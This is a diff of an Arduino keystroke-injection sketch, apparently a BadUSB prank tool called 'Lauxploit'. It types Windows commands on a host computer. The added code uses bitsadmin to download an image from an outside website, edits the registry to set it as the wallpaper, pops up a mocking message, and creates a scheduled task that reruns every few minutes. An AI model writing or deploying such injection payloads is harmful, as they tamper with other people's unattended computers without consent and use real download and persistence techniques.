@@ -90,15 +90,27 @@ void loop()
     //Keyboard.println("\"C:\\Program Files\\Internet Explorer\\iexplore.exe\" http://goo.gl/woC2kSp");
     //Keyboard.println("start http://goo.gl/x5sPkr");
     //Keyboard.println("Msg * \"Friendly reminder: NEVER LEAVE YOUR COMPUTER WITHOUT SURVEILLANCE\"");
-    Keyboard.println("bitsadmin.exe /transfer "JobName" http://thumbs.dreamstime.com/b/cartoon-girl-crying-ice-cream-drop-28115622.jpg C:\ed\lvi.jpg");
+    
+    // Have to repeat mucho time (because rundll32.exe doesn't work each time) : dirty but somehow working
+    for (int i = 0; i<7; i++)
+    {
+      Keyboard.println("bitsadmin.exe /transfer \"JobName\" http://thumbs.dreamstime.com/b/cartoon-girl-crying-ice-cream-drop-28115622.jpg C:\\lvi.jpg");
+      Keyboard.println("reg add \"HKCU\\control panel\\desktop\" /v wallpaper /t REG_SZ /d \"C:\\lvi.jpg\" /f");
+      Keyboard.println("reg add \"HKCU\\control panel\\desktop\" /v TileWallpaper /t REG_SZ /f /d 0");
+      Keyboard.println("reg add \"HKCU\\control panel\\desktop\" /v WallpaperStyle /t REG_SZ /f /d 0");
+      Keyboard.println("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters");
+      i++;  
+    }
+    Keyboard.println("Msg * \"To my beloved OLD secret admirer, please receive this gift as a mark of my unwavering love for you\"");
+    
     Keyboard.press(KEY_LEFT_CTRL);
     Keyboard.press('Z');
     delay(50);
     Keyboard.releaseAll();
     Keyboard.println(" ");
 
-    // Adding the reminder to the Windows' tasks
-    Keyboard.print("schtasks /create /sc minute /mo 5 /tn \"Lauxploit\" /tr C:");
+    // Adding the reminder to the Windows' tasks (type the number of minutes after /mo)
+    Keyboard.print("schtasks /create /sc minute /mo 3 /tn \"Lauxploit\" /tr C:");
       // Backslash escape sequence
       Keyboard.press(KEY_RIGHT_ALT);
       Keyboard.print("_");
